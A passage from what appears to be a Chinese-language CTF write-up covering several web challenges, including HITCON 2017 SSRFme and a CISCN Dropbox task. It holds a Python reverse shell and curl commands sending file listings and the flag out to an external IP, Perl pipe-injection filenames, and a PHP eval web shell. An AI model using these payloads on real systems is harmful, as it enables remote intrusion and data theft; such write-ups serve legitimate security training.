</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;file&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">res</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">value</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">response</span> <span class="o">=</span> <span class="n">Response</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">mimetype</span><span class="o">=</span><span class="s1">&#39;application/octet-stream&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Disposition&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;attachment; filename=beautiful.jpg&#39;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">response</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">value</span> <span class="o">=</span> <span class="s2">&#34;HACK ERROR!&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">value</span> <span class="o">=</span> <span class="s2">&#34;SOMETHING WRONG!&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;search.html&#39;</span><span class="p">,</span> <span class="n">res</span><span class="o">=</span><span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/no_one_know_the_manager&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">manager</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;key&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">SECRET_KEY</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">key</span> <span class="o">==</span> <span class="n">SECRET_KEY</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">shell</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;shell&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="s2">&#34;ok&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="s2">&#34;Wrong Key!&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">res</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8080</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊúÄÂêéËøô‰∏™Ë∑ØÁî±Ë¶ÅÊ±Çsecretkey</p>
<p>Ê≥®ÊÑèÂÖ≥‰∫é<code>SECRET_KEY</code>ÁöÑÈÄªËæëÔºåËôΩÁÑ∂ËØ•Êñá‰ª∂Âú®ÊâìÂºÄËØªÂèñÂêéË¢´Âà†Èô§‰∫ÜÔºå‰ΩÜÊòØÊ≥®ÊÑèËøô‰∏™Êñá‰ª∂Ê≤°ÊúâÂÖ≥Èó≠ÔºåÊâÄ‰ª•‰ªçÁÑ∂ÂèØ‰ª•ÈÄöËøá<code>/proc/self/fd/[num]</code>ËÆøÈóÆÂØπÂ∫îÊñá‰ª∂ÔºàÊ≠§Â§Ñ[num]‰ª£Ë°®‰∏Ä‰∏™Êú™Áü•ÁöÑÊï∞ÂÄºÔºåÈúÄË¶Å‰ªé0ÂºÄÂßãÈÅçÂéÜÊâæÂá∫ÔºâÔºåËøôÈáåÂú®<code>/proc/self/fd/3</code>ÊâæÂà∞</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰∏ãÈù¢Â∞±ÊòØÂºπshell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -lvp 3333
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/no_one_know_the_manager?key=07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=&amp;shell=python -c &#34;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;47.122.53.248&#39;,3333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/no_one_know_the_manager?key=07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=&amp;shell=python%20-c%20%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2247.122.53.248%22,3333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊàñËÄÖcurlÊääÊï∞ÊçÆÂ§ñÂ∏¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?key=07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=&amp;shell=curl 47.122.53.248:3333/`ls /|base64`
</span></span><span class="line"><span class="cl">?key=07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=&amp;shell=curl 47.122.53.248:3333/`cat /flag|base64`
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="hitcon-2017ssrfme">[HITCON 2017]SSRFme
</h2><p>‰ª£Á†ÅÂÆ°ËÆ°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$http_x_headers</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$http_x_headers</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$sandbox</span> <span class="o">=</span> <span class="s2">&#34;sandbox/&#34;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="s2">&#34;orange&#34;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">chdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">shell_exec</span><span class="p">(</span><span class="s2">&#34;GET &#34;</span> <span class="o">.</span> <span class="nx">escapeshellarg</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;url&#34;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$info</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;filename&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$dir</span>  <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="s2">&#34;dirname&#34;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">chdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">file_put_contents</span><span class="p">(</span><span class="nx">basename</span><span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="s2">&#34;basename&#34;</span><span class="p">]),</span> <span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>orange+ipÁöÑMD5ÂÄºÂ∞±ÊòØÁõÆÂΩïÔºåÁÑ∂Âêéurl‰º†dataÂÄºÁªôÂêéÈù¢filenameÂÜôÂÖ•ÁöÑÊñá‰ª∂</p>
<p>È¢òÁõÆÂè´ssrfmeÔºåÊàë‰ª¨ÂÖàfile://ËØª‰∏Ä‰∏ãÊñá‰ª∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?url=file:///&amp;filename=123
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250315131117847.png"
	width="1396"
	height="970"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250315131117847_hu13224382346604119864.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250315131117847_hu2301384308013477548.png 1024w"
	loading="lazy"
	
		alt="image-20250315131117847"
	
	
		class="gallery-image" 
		data-flex-grow="143"
		data-flex-basis="345px"
	
></p>
<p>ËÆøÈóÆflagÊòØÁ©∫ÁöÑÔºå‰∏ãÈù¢Êúâ‰∏™readflagÊòæÁÑ∂Ë¶ÅÁî®ÂëΩ‰ª§ÊâßË°åreadflagÊâçË°å</p>
<p>ËøôÈáåÊúâÂâçÁΩÆÁü•ËØÜÔºåÂà©Áî®perlËØ≠Ë®ÄÁöÑÊºèÊ¥ûÔºöÂõ†‰∏∫GETÂáΩÊï∞Âú®Â∫ïÂ±ÇË∞ÉÁî®‰∫ÜperlËØ≠Ë®Ä‰∏≠ÁöÑopenÂáΩÊï∞Ôºå‰ΩÜÊòØËØ•ÂáΩÊï∞Â≠òÂú®rceÊºèÊ¥û„ÄÇÂΩìopenÂáΩÊï∞Ë¶ÅÊâìÂºÄÁöÑÊñá‰ª∂Âêç‰∏≠Â≠òÂú®ÁÆ°ÈÅìÁ¨¶ÔºàÂπ∂‰∏îÁ≥ªÁªü‰∏≠Â≠òÂú®ËØ•Êñá‰ª∂ÂêçÔºâÔºåÂ∞±‰ºö‰∏≠Êñ≠ÂéüÊúâÊâìÂºÄÊñá‰ª∂Êìç‰ΩúÔºåÂπ∂‰∏îÊääËøô‰∏™Êñá‰ª∂ÂêçÂΩì‰Ωú‰∏Ä‰∏™ÂëΩ‰ª§Êù•ÊâßË°å„ÄÇ</p>
<p>ÂÖàÂàõÂª∫Êñá‰ª∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?url=&amp;filename=|/readflag
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÊâßË°åÂëΩ‰ª§</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?url=file:|readflag&amp;filename=123
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰ΩÜÊòØËøô‰∏™Â•ΩÂÉèÊúâÁÇπÈóÆÈ¢òÔºåÁî®bashÂëΩ‰ª§ËØïËØï</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?url=&amp;filename=|bash -c /readflag
</span></span><span class="line"><span class="cl">?url=file:|bash -c /readflag&amp;filename=123
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊàñËÄÖÁõ¥Êé•ÂÜôÈ©¨ËöÅÂâëËøûÊé•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?url=data://text,plain,&#39;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&#39;&amp;filename=shell.php
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250315133249902.png"
	width="511"
	height="69"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250315133249902_hu3376677698306453454.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250315133249902_hu14700647638861804952.png 1024w"
	loading="lazy"
	
		alt="image-20250315133249902"
	
	
		class="gallery-image" 
		data-flex-grow="740"
		data-flex-basis="1777px"
	
></p>
<h2 id="ciscn2019-ÂçéÂåóËµõÂå∫-day1-web1dropbox">[CISCN2019 ÂçéÂåóËµõÂå∫ Day1 Web1]Dropbox
</h2><p>Ê≥®ÂÜåÁôªÂÖ•ÂêéÊúâÊñá‰ª∂‰∏ä‰º†ÂäüËÉΩÔºå‰∏çËÉΩ‰∏ä‰º†php</p>
<p>‰∏ä‰º†ÂÖ∂‰ªñÊñá‰ª∂Êúâ‰∏ãËΩΩÂäüËÉΩÂ≠òÂú®ÁõÆÂΩïÁ©øË∂ä</p>
<p>index.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: login.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="err">include &#34;class.php&#34;;
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">$a = new FileList($_SESSION[&#39;sandbox&#39;]);
</span></span></span><span class="line"><span class="cl"><span class="err">$a-&gt;Name();
</span></span></span><span class="line"><span class="cl"><span class="err">$a-&gt;Size();
</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>class.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dbaddr</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dbuser</span> <span class="o">=</span> <span class="s2">&#34;root&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dbpass</span> <span class="o">=</span> <span class="s2">&#34;root&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">&#34;dropbox&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$dbaddr</span><span class="p">,</span> <span class="nv">$dbuser</span><span class="p">,</span> <span class="nv">$dbpass</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$db</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="nv">$db</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span> <span class="o">=</span> <span class="nv">$db</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">user_exist</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&#34;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">&#34;s&#34;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">store_result</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$count</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$count</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">add_user</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user_exist</span><span class="p">(</span><span class="nv">$username</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$password</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$password</span> <span class="o">.</span> <span class="s2">&#34;SiAchGHmFx&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&#34;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">&#34;ss&#34;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">verify_user</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user_exist</span><span class="p">(</span><span class="nv">$username</span><span class="p">))</span> <span class="p">{</span>
